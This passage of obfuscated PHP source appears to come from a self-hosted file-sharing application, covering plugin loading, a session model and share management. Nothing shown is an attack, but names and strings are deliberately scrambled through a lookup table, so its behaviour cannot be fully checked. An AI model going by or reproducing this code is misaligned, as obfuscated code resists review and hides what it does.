unset($òÛÉ¨şÑ[$Í°™ù´æ[2161]], $òÛÉ¨şÑ[$Í°™ù´æ[6]]); $ÖôåÚ Ö = PLUGIN_DIR . $òÛÉ¨şÑ[$Í°™ù´æ[32]] . $Í°™ù´æ[2163]; if (!is_file($ÖôåÚ Ö)) { continue; } $ ò£¨®¯ = Hook::apply($òÛÉ¨şÑ[$Í°™ù´æ[32]] . $Í°™ù´æ[2171]); if (!is_array($ ò£¨®¯)) { continue; } $ëØ÷Ì€[$””«úÎÃ] = array_merge($òÛÉ¨şÑ, $ ò£¨®¯); if ($áé–Ü¸÷[$Í°™ù´æ[6]][$Í°™ù´æ[1747]] != $ ò£¨®¯[$Í°™ù´æ[1721]]) { Hook::apply($òÛÉ¨şÑ[$Í°™ù´æ[32]] . $Í°™ù´æ[2168]); $áé–Ü¸÷[$Í°™ù´æ[6]][$Í°™ù´æ[1747]] = $ ò£¨®¯[$Í°™ù´æ[1721]]; $this->update($òÛÉ¨şÑ[$Í°™ù´æ[492]], array($Í°™ù´æ[6] => $áé–Ü¸÷[$Í°™ù´æ[6]])); } } return $ëØ÷Ì€; } private function loadPluginList() { $Íàî«çß =& $_SERVER[¬ÏÕ§Áú]; $†ÉÄÇü = $this->loadList(); if (strtolower(MOD) == $Íàî«çß[2172]) { return $†ÉÄÇü; } $¾”‘†¢¿ = Hook::trigger($Íàî«çß[2173], $†ÉÄÇü); if ($†ÉÄÇü && !$¾”‘†¢¿) { die; } return $¾”‘†¢¿ ? $¾”‘†¢¿ : $†ÉÄÇü; } private function pluginScan($–•²§”¬) { $¦˜÷Ğı— =& $_SERVER[¬ÏÕ§Áú]; recursion_dir(PLUGIN_DIR, $òÎİ ÉÂ, $—·´ÁÌù, 0); foreach ($òÎİ ÉÂ as $Æäïæ„û) { $÷Ø¦ì½³ = get_path_this($Æäïæ„û); if (isset($–•²§”¬[$÷Ø¦ì½³]) || !file_exists($Æäïæ„û . $¦˜÷Ğı—[2174]) || !file_exists($Æäïæ„û . $¦˜÷Ğı—[2163])) { continue; } Hook::apply($÷Ø¦ì½³ . $¦˜÷Ğı—[2168]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\137\x73\x65\163\163\x69\x6f\x6e"; public function get($Â¬£œÔî) { $ëçÅ”ÁÌ =& $_SERVER[¬ÏÕ§Áú]; $ƒ¶¡µª = $this->where(array($ëçÅ”ÁÌ[2175] => $Â¬£œÔî))->find(); if (!is_array($ƒ¶¡µª)) { return !1; } return $ƒ¶¡µª[$ëçÅ”ÁÌ[181]]; } public function set($Å„ £¬¦, $ÏéĞó¶Ï, $¥“òú = 3600) { $Ôª·–Ì¨ =& $_SERVER[¬ÏÕ§Áú]; $Æñ¥õ”˜ = array($Ôª·–Ì¨[2175] => $Å„ £¬¦, $Ôª·–Ì¨[2076] => $ÏéĞó¶Ï, $Ôª·–Ì¨[2176] => $¥“òú + time()); if (Session::get($Ôª·–Ì¨[2177])) { $Æñ¥õ”˜[$Ôª·–Ì¨[1837]] = Session::get($Ôª·–Ì¨[2177]); } else { $Æñ¥õ”˜[$Ôª·–Ì¨[1837]] = 0; } if ($this->get($Å„ £¬¦)) { return $this->where(array($Ôª·–Ì¨[2175] => $Å„ £¬¦))->save($Æñ¥õ”˜); } else { return $this->add($Æñ¥õ”˜, array(), !0); } } public function remove($¼Ø¤ÙÒ) { return $this->where(array($_SERVER[¬ÏÕ§Áú][2175] => $¼Ø¤ÙÒ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¬ÏÕ§Áú][2178] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\x69\x6d\145", "\164\151\x6d\x65", "\151\x6e\163\x65\x72\x74\54\x75\x70\x64\x61\x74\145", "\x66\x75\156\x63\164\x69\x6f\x6e"), array("\143\x72\145\x61\x74\145\124\151\155\x65", "\164\151\x6d\x65", "\151\x6e\163\145\162\164", "\x66\165\156\x63\164\x69\157\156"), array("\x6f\x70\164\151\x6f\156\x73", '', "\x69\156\x73\x65\x72\x74\54\x75\x70\144\x61\164\x65\x2c\x73\145\154\145\x63\164", "\152\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ú×û¬üğ) { $…‘À¬’Ü =& $_SERVER[¬ÏÕ§Áú]; $½¹Š°ö = isset($ú×û¬üğ[0]) ? $ú×û¬üğ[0] : !1; $Ã¹Ä÷± = $…‘À¬’Ü[2179] . USER_ID; return array($…‘À¬’Ü[2180] => array(USER_ID, $…‘À¬’Ü[2181]), $…‘À¬’Ü[2120] => array($½¹Š°ö, $…‘À¬’Ü[2182], $Ã¹Ä÷±)); } protected function listSimple() { $áœ›ë³í = array($_SERVER[¬ÏÕ§Áú][1837] => USER_ID); $º½Ô•Ä÷ = $this->field($this->fieldList)->where($áœ›ë³í)->select(); return $º½Ô•Ä÷ ? $º½Ô•Ä÷ : array(); } protected function getInfo($ú†Œö«È, $¤’Á÷«Å = false, $¤Ş¥ÚŞŠ = '') { $ŒÑ§¶¶§ =& $_SERVER[¬ÏÕ§Áú]; if (!$¤Ş¥ÚŞŠ) { $¤Ş¥ÚŞŠ = $ŒÑ§¶¶§[2179] . USER_ID; } if ($¤’Á÷«Å) { return $this->_getShareInfo(array($ŒÑ§¶¶§[689] => $ú†Œö«È)); } $èñ¡ûŒ­ = $this->cacheFunctionGet($ŒÑ§¶¶§[2122], $ú†Œö«È, $¤Ş¥ÚŞŠ); $Ò¶Ğ°Îó = $this->shareInfoMofify($èñ¡ûŒ­, $ŒÑ§¶¶§[236]); if (isset($èñ¡ûŒ­[$ŒÑ§¶¶§[98]]) && $Ò¶Ğ°Îó != $èñ¡ûŒ­[$ŒÑ§¶¶§[98]]) { $‚ÔâÕÔ± = $this->cacheKeyMake($ŒÑ§¶¶§[2122], $ú†Œö«È, $¤Ş¥ÚŞŠ); $èñ¡ûŒ­ = $this->_getShareInfo(array($ŒÑ§¶¶§[689] => $ú†Œö«È)); Cache::set($‚ÔâÕÔ±, $èñ¡ûŒ­); } return $èñ¡ûŒ­; } private function shareInfoMofify(&$Ğ¾Íæœ¢, $›ÁŸ¥˜ = "\147\145\164") { $ñºó‘å« =& $_SERVER[¬ÏÕ§Áú]; if (!$Ğ¾Íæœ¢ || !isset($Ğ¾Íæœ¢[$ñºó‘å«[689]])) { return; } $Ôı¨³Ÿ… = $ñºó‘å«[2183] . $Ğ¾Íæœ¢[$ñºó‘å«[689]]; if ($›ÁŸ¥˜ == $ñºó‘å«[236]) { return Cache::get($Ôı¨³Ÿ…); } else { if ($›ÁŸ¥˜ == $ñºó‘å«[2151]) { $šÀöûÇ = Cache::get($Ôı¨³Ÿ…); if ($šÀöûÇ === $Ğ¾Íæœ¢[$ñºó‘å«[98]]) { return; } $Ğ¾Íæœ¢[$ñºó‘å«[2184]] = USER_ID . $ñºó‘å«[482] . $Ğ¾Íæœ¢[$ñºó‘å«[98]]; Cache::set($Ôı¨³Ÿ…, $Ğ¾Íæœ¢[$ñºó‘å«[98]]); } else { if ($›ÁŸ¥˜ == $ñºó‘å«[2185]) { Cache::remove($Ôı¨³Ÿ…); } } } } public function getInfoByHash($ú³ óìƒ) { return $this->_getShareInfo(array($_SERVER[¬ÏÕ§Áú][2186] => $ú³ óìƒ)); } public function getInfoByPath($®®ÅÊª) { $Ë í›šØ =& $_SERVER[¬ÏÕ§Áú]; $ŒÄ„¤Û = array($Ë í›šØ[1837] => USER_ID, $Ë í›šØ[204] => $®®ÅÊª); return $this->_getShareInfo($ŒÄ„¤Û); } public function getInfoBySourcePath($õ¢¥•Ÿ) { $ï®¾†ş× =& $_SERVER[¬ÏÕ§Áú]; $²ª®Ü‚ï = array($ï®¾†ş×[1837] => USER_ID, $ï®¾†ş×[1312] => $õ¢¥•Ÿ); return $this->_getShareInfo($²ª®Ü‚ï); } private function _getShareInfo($ô÷ËßÍş) { $Ü…å‰³ =& $_SERVER[¬ÏÕ§Áú]; $„–”õ¹Å = $this->where($ô÷ËßÍş)->find(); if (!$„–”õ¹Å) { return !1; } $ô÷ËßÍş = array($Ü…å‰³[689] => $„–”õ¹Å[$Ü…å‰³[689]]); $ïİæ × = $Ü…å‰³[2187]; $Òü™„ã¡ = Model($Ü…å‰³[690])->order($Ü…å‰³[492])->field($ïİæ ×)->where($ô÷ËßÍş)->select(); if ($„–”õ¹Å[$Ü…å‰³[204]] == $Ü…å‰³[241]) { $„–”õ¹Å[$Ü…å‰³[100]] = IO::info($„–”õ¹Å[$Ü…å‰³[1312]]); } else { $„–”õ¹Å[$Ü…å‰³[100]] = Model($Ü…å‰³[1483])->pathInfo($„–”õ¹Å[$Ü…å‰³[204]]); } $„–”õ¹Å[$Ü…å‰³[2188]] = $Òü™„ã¡; $this->shareInfoMofify($„–”õ¹Å, $Ü…å‰³[2151]); return $„–”õ¹Å; } protected function getInfoAuth($»§©®—) { $…§ª×¸Ê =& $_SERVER[¬ÏÕ§Áú]; $Ñ„›Øûœ = $this->getInfo($»§©®—); if ($Ñ„›Øûœ[$…§ª×¸Ê[1837]] == USER_ID) { $Ñ„›Øûœ[$…§ª×¸Ê[507]] = $Ñ„›Øûœ[$…§ª×¸Ê[100]][$…§ª×¸Ê[507]]; } else { $Ñ„›Øûœ[$…§ª×¸Ê[507]] = Model($…§ª×¸Ê[588])->authMake($Ñ„›Øûœ[$…§ª×¸Ê[2188]]); } return $Ñ„›Øûœ; } protected function listData($âÁÓ‰Ë = null, $¼„£– = 300) { $¾Ş’üöŸ =& $_SERVER[¬ÏÕ§Áú]; $˜ÀäÒÆ… = array(array($¾Ş’üöŸ[583] => array($¾Ş’üöŸ[1137], 0), $¾Ş’üöŸ[687] => array($¾Ş’üöŸ[1137], 0), $¾Ş’üöŸ[2189] => $¾Ş’üöŸ[2139])); if ($âÁÓ‰Ë == $¾Ş’üöŸ[2190]) { $˜ÀäÒÆ… = array($¾Ş’üöŸ[583] => 1); } else { if ($âÁÓ‰Ë == $¾Ş’üöŸ[1295]) { $˜ÀäÒÆ… = array($¾Ş’üöŸ[687] => 1); } } $˜ÀäÒÆ…[$¾Ş’üöŸ[1837]] = USER_ID; $„ûŸ¥şİ = $this->where($˜ÀäÒÆ…)->selectPage($¼„£–); return $„ûŸ¥şİ; } protected function listToMe($¨ã§³ŸÊ = 300) { $™ó†¨Ğş =& $_SERVER[¬ÏÕ§Áú]; $î“¨½üÇ = Model($™ó†¨Ğş[2191])->userGroupParents(USER_ID); $ÅÎ¨ı×Á = array($™ó†¨Ğş[672] => SourceModel::TYPE_USER, $™ó†¨Ğş[590] => USER_ID); if ($î“¨½üÇ) { $ÅÎ¨ı×Á = array(array($™ó†¨Ğş[672] => SourceModel::TYPE_USER, $™ó†¨Ğş[590] => USER_ID), array($™ó†¨Ğş[672] => SourceModel::TYPE_GROUP, $™ó†¨Ğş[590] => array($™ó†¨Ğş[7], $î“¨½üÇ)), $™ó†¨Ğş[2189] => $™ó†¨Ğş[2139]); } $—ó½ÂÛ® = Model($™ó†¨Ğş[690])->where($ÅÎ¨ı×Á)->selectPage($¨ã§³ŸÊ); $³ ‡€©Ô = array_to_keyvalue_group($—ó½ÂÛ®[$™ó†¨Ğş[456]], $™ó†¨Ğş[689]); if (!$³ ‡€©Ô) { return $—ó½ÂÛ®; } $£Ëêôóµ = $™ó†¨Ğş[2192]; $ÅÎ¨ı×Á = array($™ó†¨Ğş[689] => array($™ó†¨Ğş[512], array_keys($³ ‡€©Ô)), $™ó†¨Ğş[1837] => array($™ó†¨Ğş[1139], $™ó†¨Ğş[241])); $Á·ş×´ = $this->field($£Ëêôóµ)->where($ÅÎ¨ı×Á)->select(); foreach ($Á·ş×´ as $³¶÷øòÄ => &$˜èï¢Á¨) { $˜èï¢Á¨[$™ó†¨Ğş[2188]] = $³ ‡€©Ô[$˜èï¢Á¨[$™ó†¨Ğş[689]]]; } unset($˜èï¢Á¨); $ä×û²±å = array($™ó†¨Ğş[2193] => $Á·ş×´, $™ó†¨Ğş[2194] => $—ó½ÂÛ®[$™ó†¨Ğş[453]]); return $ä×û²±å; } protected function shareAdd($®Ø—¶», $İøö°§ë) { $‚‰­‰ı =& $_SERVER[¬ÏÕ§Áú]; $…çõåòä = $this->_addShareData($®Ø—¶», $İøö°§ë); if (!empty($İøö°§ë[$‚‰­‰ı[2195]])) { $this->_shareAuthSet($…çõåòä, $İøö°§ë[$‚‰­‰ı[2195]]); } $this->shareEventAdd($®Ø—¶», $İøö°§ë, $‚‰­‰ı[2196]); return $…çõåòä; } protected function shareAddSystem($Õò¸¯Â˜, $ñ³©å¯¾) { $àŠè•·Ì =& $_SERVER[¬ÏÕ§Áú]; $ò „•êó = $this->_addShareData($Õò¸¯Â˜, $ñ³©å¯¾, $àŠè•·Ì[202]); $this->_shareAuthSet($ò „•êó, $ñ³©å¯¾[$àŠè•·Ì[2195]]); return $ò „•êó; } private function shareEventAdd($ŞŠ¼Ü„Á, $Ùˆº·äÏ, $Ç·Šƒô = "\141\x64\x64") { $Ü¿øİíã =& $_SERVER[¬ÏÕ§Áú]; if (!$ŞŠ¼Ü„Á || $ŞŠ¼Ü„Á == $Ü¿øİíã[241]) { return; } if ($Ç·Šƒô == $Ü¿øİíã[2196]) { if ($Ùˆº·äÏ[$Ü¿øİíã[583]] == $Ü¿øİíã[101]) { Model($Ü¿øİíã[657])->eventShare($ŞŠ¼Ü„Á, $Ü¿øİíã[2197]); } if ($Ùˆº·äÏ[$Ü¿øİíã[687]] == $Ü¿øİíã[101]) { Model($Ü¿øİíã[657])->eventShare($ŞŠ¼Ü„Á, $Ü¿øİíã[2198]); } return; } $¢š×Æô• = $this->getInfoByPath($ŞŠ¼Ü„Á); $Ä¥Óì = $Ü¿øİíã[2199]; if ($¢š×Æô•[$Ü¿øİíã[583]] == $Ü¿øİíã[241] && $Ùˆº·äÏ[$Ü¿øİíã[583]] == $Ü¿øİíã[101]) { $Ä¥Óì = $Ü¿øİíã[2197]; } if ($¢š×Æô•[$Ü¿øİíã[583]] == $Ü¿øİíã[101] && $Ùˆº·äÏ[$Ü¿øİíã[583]] == $Ü¿øİíã[241]) { $Ä¥Óì = $Ü¿øİíã[2200]; } if ($¢š×Æô•[$Ü¿øİíã[687]] == $Ü¿øİíã[241] && $Ùˆº·äÏ[$Ü¿øİíã[687]] == $Ü¿øİíã[101]) { $Ä¥Óì = $Ü¿øİíã[2198]; } if ($¢š×Æô•[$Ü¿øİíã[687]] == $Ü¿øİíã[101] && $Ùˆº·äÏ[$Ü¿øİíã[687]] == $Ü¿øİíã[241]) { $Ä¥Óì = $Ü¿øİíã[2201]; } Model($Ü¿øİíã[657])->eventShare($ŞŠ¼Ü„Á, $Ä¥Óì); return; } private function _addShareData($üÂÉ Ó·, $îŞ§Œ‘­ = array(), $µâºåêË = false) { $§õœ©˜Ğ =& $_SERVER[¬ÏÕ§Áú]; $äÛ¬‚œ× = $µâºåêË == $§õœ©˜Ğ[202] ? 0 : USER_ID; $©­‚¥Ù = array($§õœ©˜Ğ[511] => $üÂÉ Ó·, $§õœ©˜Ğ[1828] => $äÛ¬‚œ×); if ($üÂÉ Ó· == 0) { $©­‚¥Ù = array($§õœ©˜Ğ[2202] => $îŞ§Œ‘­[$§õœ©˜Ğ[1312]], $§õœ©˜Ğ[1828] => $äÛ¬‚œ×); } if ($¤Ìƒ©Ú = $this->where($©­‚¥Ù)->find()) { return $¤Ìƒ©Ú[$§õœ©˜Ğ[689]]; } if ($üÂÉ Ó· == 0) { $®ë’©Ô§ = array($§õœ©˜Ğ[32] => get_path_this($îŞ§Œ‘­[$§õœ©˜Ğ[97]])); } else { $®ë’©Ô§ = Model($§õœ©˜Ğ[946])->sourceInfo($üÂÉ Ó·); if (!$®ë’©Ô§) { return !1; } } if (!$îŞ§Œ‘­[$§õœ©˜Ğ[1722]]) { $îŞ§Œ‘­[$§õœ©˜Ğ[1722]] = $®ë’©Ô§[$§õœ©˜Ğ[32]]; } $ø¨ÈÄô = array($§õœ©˜Ğ[1828] => $äÛ¬‚œ×, $§õœ©˜Ğ[511] => $üÂÉ Ó·, $§õœ©˜Ğ[1722] => $§õœ©˜Ğ[12], $§õœ©˜Ğ[583] => 0, $§õœ©˜Ğ[687] => 0, $§õœ©˜Ğ[1312] => $§õœ©˜Ğ[12], $§õœ©˜Ğ[393] => $§õœ©˜Ğ[12], $§õœ©˜Ğ[1011] => $§õœ©˜Ğ[12], $§õœ©˜Ğ[2203] => 0, $§õœ©˜Ğ[2204] => 0, $§õœ©˜Ğ[875] => 0, $§õœ©˜Ğ[2205] => $§õœ©˜Ğ[12], $§õœ©˜Ğ[2186] => $§õœ©˜Ğ[12]); $ñ€ÌğÕ• = explode($§õœ©˜Ğ[50], $§õœ©˜Ğ[2206]); foreach ($ñ€ÌğÕ• as $û“ûşÃÈ) { if (!isset($îŞ§Œ‘­[$û“ûşÃÈ])) { continue; } $ø¨ÈÄô[$û“ûşÃÈ] = $îŞ§Œ‘­[$û“ûşÃÈ]; } $¾ñ“Ë° = $this->add($ø¨ÈÄô); $Í¼ò¯‹ä = array($§õœ©˜Ğ[2186] => short_id($¾ñ“Ë°)); if ($this->where($Í¼ò¯‹ä)->find()) { $Í¼ò¯‹ä[$§õœ©˜Ğ[2186]] .= $§õœ©˜Ğ[482] . rand_string(2, 3); } $this->where(array($§õœ©˜Ğ[2207] => $¾ñ“Ë°))->save($Í¼ò¯‹ä); return $¾ñ“Ë°; } private function _shareAuthSet($‡ìÎ¢ò, $ ³´°şŠ) { $ŒœÒµ  =& $_SERVER[¬ÏÕ§Áú]; if (!is_array($ ³´°şŠ)) { return !1; } $Şı½‰¯º = Model($ŒœÒµ [2149]); $Şı½‰¯º->where(array($ŒœÒµ [689] => $‡ìÎ¢ò))->delete(); $‹÷…Ç„ò = array(); foreach ($ ³´°şŠ as $§ÛÚ‚ùÎ) { $„ëĞçü† = SourceModel::TYPE_USER; if ($§ÛÚ‚ùÎ[$ŒœÒµ [201]] == SourceModel::TYPE_GROUP) { $„ëĞçü† = SourceModel::TYPE_GROUP; } $²ƒúà—ë = array($ŒœÒµ [689] => $‡ìÎ¢ò, $ŒœÒµ [201] => $„ëĞçü†, $ŒœÒµ [590] => intval($§ÛÚ‚ùÎ[$ŒœÒµ [590]]), $ŒœÒµ [2145] => 0, $ŒœÒµ [2208] => -1); if ($§ÛÚ‚ùÎ[$ŒœÒµ [2145]]) { $²ƒúà—ë[$ŒœÒµ [2145]] = $§ÛÚ‚ùÎ[$ŒœÒµ [2145]]; } else { if ($§ÛÚ‚ùÎ[$ŒœÒµ [2208]]) { $²ƒúà—ë[$ŒœÒµ [2208]] = $§ÛÚ‚ùÎ[$ŒœÒµ [2208]]; } } $‹÷…Ç„ò[] = $²ƒúà—ë; } return $Şı½‰¯º->addAll($‹÷…Ç„ò, array(), !0); } public function numViewAdd($Ä¿­™Œ§) { $è«Ïø¼Ü =& $_SERVER[¬ÏÕ§Áú]; $ß÷€ë€‹ = array($è«Ïø¼Ü[2207] => $Ä¿­™Œ§); $this->where($ß÷€ë€‹)->setAdd($è«Ïø¼Ü[2203]); } public function numDownloadAdd($ş£¬¨¾µ) { $€†¾â“ =& $_SERVER[¬ÏÕ§Áú]; $€Èš—°÷ = array($€†¾â“[2207] => $ş£¬¨¾µ); $this->where($€Èš—°÷)->setAdd($€†¾â“[2204]); } protected function shareEdit($‹ºÒı—½, $´¨Î¾Â—) { $§€È¡¬Œ =& $_SERVER[¬ÏÕ§Áú]; $ü´ ¯ˆ· = $this->getInfo($‹ºÒı—½); if (!$ü´ ¯ˆ·) { return !1; } if ($´¨Î¾Â—[$§€È¡¬Œ[2186]] && $´¨Î¾Â—[$§€È¡¬Œ[583]] == $§€È¡¬Œ[101]) { if ($´¨Î¾Â—[$§€È¡¬Œ[2186]] == $ü´ ¯ˆ·[$§€È¡¬Œ[2186]]) { unset($´¨Î¾Â—[$§€È¡¬Œ[2186]]); } if ($´¨Î¾Â—[$§€È¡¬Œ[2186]]) { $‰€ÅÆˆ© = $this->where(array($§€È¡¬Œ[2209] => $´¨Î¾Â—[$§€È¡¬Œ[2186]]))->find(); if ($‰€ÅÆˆ©) { return !1; } if (!is_array($´¨Î¾Â—[$§€È¡¬Œ[2205]])) { $´¨Î¾Â—[$§€È¡¬Œ[2205]] = is_array($ü´ ¯ˆ·[$§€È¡¬Œ[2205]]) ? $ü´ ¯ˆ·[$§€È¡¬Œ[2205]] : array(); } if (!$´¨Î¾Â—[$§€È¡¬Œ[2205]][$§€È¡¬Œ[2210]]) { $´¨Î¾Â—[$§€È¡¬Œ[2205]][$§€È¡¬Œ[2210]] = $ü´ ¯ˆ·[$§€È¡¬Œ[2186]]; $´¨Î¾Â—[$§€È¡¬Œ[2205]][$§€È¡¬Œ[2211]] = $§€È¡¬Œ[101]; } } } $this->_checkLinkShare($´¨Î¾Â—, $ü´ ¯ˆ·); $õÎßÕƒé = array(); $Î¥òÔı¨ = explode($§€È¡¬Œ[50], $§€È¡¬Œ[2212]); foreach ($Î¥òÔı¨ as $Ÿ÷ëüÚ‡) { if (!array_key_exists($Ÿ÷ëüÚ‡, $´¨Î¾Â—)) { continue; } $õÎßÕƒé[$Ÿ÷ëüÚ‡] = $´¨Î¾Â—[$Ÿ÷ëüÚ‡]; } $this->shareEventAdd($ü´ ¯ˆ·[$§€È¡¬Œ[204]], $´¨Î¾Â—, $§€È¡¬Œ[2007]); $this->where(array($§€È¡¬Œ[2207] => $‹ºÒı—½))->save($õÎßÕƒé); if (isset($´¨Î¾Â—[$§€È¡¬Œ[2195]])) { $this->_shareAuthSet($‹ºÒı—½, $´¨Î¾Â—[$§€È¡¬Œ[2195]]); } return !0; } private function _checkLinkShare($ÏÌ·áç¿, $Û´°”ÊÒ) { $¨„˜Ÿ‚¶ =& $_SERVER[¬ÏÕ§Áú]; if ($ÏÌ·áç¿[$¨„˜Ÿ‚¶[583]] != $¨„˜Ÿ‚¶[101]) { return; } $ ÂÀÅÙ = $Û´°”ÊÒ[$¨„˜Ÿ‚¶[100]][$¨„˜Ÿ‚¶[204]]; if ($Û´°”ÊÒ[$¨„˜Ÿ‚¶[100]][$¨„˜Ÿ‚¶[33]] != $¨„˜Ÿ‚¶[243]) { $¥µ€ÍÀÄ = $this->_folderReport($ ÂÀÅÙ); if (!$¥µ€ÍÀÄ) { return; } show_json(LNG($¨„˜Ÿ‚¶[2213]) . $¨„˜Ÿ‚¶[2214] . $¥µ€ÍÀÄ, !1); } $ÆëÉ®ÚÛ = Model($¨„˜Ÿ‚¶[946])->fileInfoGet($Û´°”ÊÒ[$¨„˜Ÿ‚¶[100]][$¨„˜Ÿ‚¶[204]]); if (!$ÆëÉ®ÚÛ) { return; } $ÎáÚ™ìë = $this->shareFileMeta($ÆëÉ®ÚÛ[$¨„˜Ÿ‚¶[562]]); if (isset($ÎáÚ™ìë[$¨„˜Ÿ‚¶[461]]) && $ÎáÚ™ìë[$¨„˜Ÿ‚¶[461]] == $¨„˜Ÿ‚¶[101]) { show_json(LNG($¨„˜Ÿ‚¶[2215]), !1); } } private function _folderReport($–¸ı¯êô) { $ÆõŸ–‚œ =& $_SERVER[¬ÏÕ§Áú]; $èı«ó¶Œ = array($ÆõŸ–‚œ[562] => array($ÆõŸ–‚œ[1137], 0), $ÆõŸ–‚œ[863] => 3); $ıâáª¦û = Model($ÆõŸ–‚œ[2216])->where($èı«ó¶Œ)->field($ÆõŸ–‚œ[562])->select(); if (!$ıâáª¦û) { return !1; } $ıâáª¦û = array_to_keyvalue($ıâáª¦û, $ÆõŸ–‚œ[12], $ÆõŸ–‚œ[562]); $ùøú°ã = $ÆõŸ–‚œ[50] . $–¸ı¯êô . $ÆõŸ–‚œ[50]; $èı«ó¶Œ = array($ÆõŸ–‚œ[562] => array($ÆõŸ–‚œ[7], $ıâáª¦û), $ÆõŸ–‚œ[605] => array($ÆõŸ–‚œ[479], "\45{$ùøú°ã}\x25"), $ÆõŸ–‚œ[525] => 0); $µïÙìÏë = Model($ÆõŸ–‚œ[946])->where($èı«ó¶Œ)->field($ÆõŸ–‚œ[2217])->find(); if (!$µïÙìÏë) { return !1; } $Ü¥·Ø¯ = substr($µïÙìÏë[$ÆõŸ–‚œ[605]], strpos($µïÙìÏë[$ÆõŸ–‚œ[605]], $ùøú°ã)); $èı«ó¶Œ = array($ÆõŸ–‚œ[204] => array($ÆõŸ–‚œ[7], trim($Ü¥·Ø¯, $ÆõŸ–‚œ[50]))); $×÷§ÀÁ = Model($ÆõŸ–‚œ[946])->where($èı«ó¶Œ)->field($ÆõŸ–‚œ[32])->select(); $°Åà‰ = array_to_keyvalue($×÷§ÀÁ, $ÆõŸ–‚œ[12], $ÆõŸ–‚œ[32]); $°Åà‰[] = $µïÙìÏë[$ÆõŸ–‚œ[32]]; return implode($ÆõŸ–‚œ[8], $°Åà‰); } protected function remove($‚ªû®æ) { $”«ÀÔÇ =& $_SERVER[¬ÏÕ§Áú]; $ı­ÀÃ·û = is_array($‚ªû®æ) ? $‚ªû®æ : array($‚ªû®æ); for ($¶Â†ì®Ö = 0; $¶Â†ì®Ö < count($ı­ÀÃ·û); $¶Â†ì®Ö++) { $ØëÆÂ´ = $this->getInfo($ı­ÀÃ·û[$¶Â†ì®Ö]); if ($ØëÆÂ´[$”«ÀÔÇ[687]] == $”«ÀÔÇ[101]) { Model($”«ÀÔÇ[657])->eventShare($ØëÆÂ´[$”«ÀÔÇ[204]], $”«ÀÔÇ[2201]); } if ($ØëÆÂ´[$”«ÀÔÇ[583]] == $”«ÀÔÇ[101]) { Model($”«ÀÔÇ[657])->eventShare($ØëÆÂ´[$”«ÀÔÇ[204]], $”«ÀÔÇ[2200]); } $this->shareInfoMofify($ØëÆÂ´, $”«ÀÔÇ[2185]); } $±íƒû = array($”«ÀÔÇ[689] => array($”«ÀÔÇ[7], $ı­ÀÃ·û)); $ÑğÏµ—× = $this->where($±íƒû)->delete(); if ($ÑğÏµ—×) { Model($”«ÀÔÇ[690])->where($±íƒû)->delete(); } return $ÑğÏµ—×; } protected function removeBySource($œÆïĞ§ ) { $ŞóµÈˆî =& $_SERVER[¬ÏÕ§Áú]; $ñáİ×ş¥ = array($ŞóµÈˆî[511] => array($ŞóµÈˆî[512], $œÆïĞ§ )); $™¿Çµ­± = $this->field($ŞóµÈˆî[689])->where($ñáİ×ş¥)->select(); $ÅÍÕû¬Ú = array_to_keyvalue($™¿Çµ­±, $ŞóµÈˆî[12], $ŞóµÈˆî[689]); if (!$ÅÍÕû¬Ú) { return; } foreach ($™¿Çµ­± as $™Ëç¯Šã) { $this->shareInfoMofify($™Ëç¯Šã, $ŞóµÈˆî[2185]); } $ñáİ×ş¥ = array($ŞóµÈˆî[2207] => array($ŞóµÈˆî[512], $ÅÍÕû¬Ú)); $this->where($ñáİ×ş¥)->delete(); Model($ŞóµÈˆî[690])->where($ñáİ×ş¥)->delete(); } public function listAll($¡‘´Ñ†‰) { $©£–Äó° =& $_SERVER[¬ÏÕ§Áú]; $ó´Ëİ¶Ø = array(); if ($¡‘´Ñ†‰[$©£–Äó°[1837]]) { $ó´Ëİ¶Ø[$©£–Äó°[1837]] = $¡‘´Ñ†‰[$©£–Äó°[1837]]; } if ($¡‘´Ñ†‰[$©£–Äó°[874]]) { $‰†²µ° = $¡‘´Ñ†‰[$©£–Äó°[875]] ? $¡‘´Ñ†‰[$©£–Äó°[875]] : strtotime(date($©£–Äó°[2218])); $ó´Ëİ¶Ø[$©£–Äó°[244]] = array($©£–Äó°[419], array($¡‘´Ñ†‰[$©£–Äó°[874]], $‰†²µ°)); } if ($¡‘´Ñ†‰[$©£–Äó°[33]]) { $ó´Ëİ¶Ø[$¡‘´Ñ†‰[$©£–Äó°[33]]] = 1; } else { $ó´Ëİ¶Ø[] = array($©£–Äó°[583] => array($©£–Äó°[1137], 0), $©£–Äó°[687] => array($©£–Äó°[1137], 0), $©£–Äó°[2189] => $©£–Äó°[2139]); } if ($¡‘´Ñ†‰[$©£–Äó°[2135]]) { $ó´Ëİ¶Ø[] = array($©£–Äó°[2186] => $¡‘´Ñ†‰[$©£–Äó°[2135]], $©£–Äó°[1722] => array($©£–Äó°[479], "\x25{$¡‘´Ñ†‰[$©£–Äó°[2135]]}\x25"), $©£–Äó°[2189] => $©£–Äó°[2139]); } $Âüö½£ = $this->_makeOrder()->where($ó´Ëİ¶Ø)->selectPage(20); if (empty($Âüö½£[$©£–Äó°[456]])) { return array(); } $this->_listDataApply($Âüö½£[$©£–Äó°[456]]); return $Âüö½£; } public function listDataApply($µ»İ…ÓÑ) { $this->_listDataApply($µ»İ…ÓÑ); return $µ»İ…ÓÑ; } private function _listDataApply(&$‰™ó‚ƒ¿) { $’ÖŸ“¯ù =& $_SERVER[¬ÏÕ§Áú]; $ŠØó¶¯é = array_to_keyvalue($‰™ó‚ƒ¿, $’ÖŸ“¯ù[12], $’ÖŸ“¯ù[1837]); $Şå…¹äÑ = Model($’ÖŸ“¯ù[618])->userListInfo(array_unique($ŠØó¶¯é)); $ç‹àÉŒ = array_to_keyvalue($‰™ó‚ƒ¿, $’ÖŸ“¯ù[12], $’ÖŸ“¯ù[204]); $ÚÕŒãĞ = Model($’ÖŸ“¯ù[946])->sourceListInfo($ç‹àÉŒ, !0); foreach ($‰™ó‚ƒ¿ as $ªæŸ§ù— => &$ö˜ˆûĞ±) { $ŞÙ²üîî = $ö˜ˆûĞ±[$’ÖŸ“¯ù[1837]]; $ö˜ˆûĞ±[$’ÖŸ“¯ù[2219]] = $Şå…¹äÑ[$ŞÙ²üîî] ? $Şå…¹äÑ[$ŞÙ²üîî] : !1; if 